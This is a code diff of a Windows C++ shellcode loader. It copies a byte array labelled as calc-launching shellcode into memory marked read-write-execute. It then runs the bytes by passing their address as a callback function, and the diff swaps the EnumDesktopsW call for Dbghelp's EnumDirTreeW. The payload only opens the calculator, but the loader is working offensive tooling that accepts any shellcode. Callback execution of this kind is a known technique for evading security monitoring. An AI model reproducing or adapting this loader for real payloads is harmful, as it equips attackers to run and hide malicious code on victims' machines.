@@ -1,15 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 
-
-
-int err(const char* errmsg) {
-
-
-    printf("Error: %s (%u)\n", errmsg, ::GetLastError());
-    return 1;
-
-}
+// requires Dbghelp.lib
+#include <Dbghelp.h>
+#pragma comment(lib, "Dbghelp.lib")
 
 // alfarom256 calc shellcode
 unsigned char op[] =
@@ -33,17 +27,16 @@ unsigned char op[] =
 "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
 "\x63\x2e\x65\x78\x65\x00";
 
-
-
 int main() {
 
 
-	LPVOID addr = ::VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	::RtlMoveMemory(addr, op, sizeof(op));
+    LPVOID address = ::VirtualAlloc(NULL, sizeof(op), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(address, &op[0], sizeof(op));
 
-    ::EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)addr, NULL);
+    ::SymInitialize(::GetCurrentProcess(), NULL, TRUE);
 
-    Sleep(10000);
-    printf("success");
+    WCHAR dummy[522];
+    ::EnumDirTreeW(::GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)address, NULL);
+
 
 }
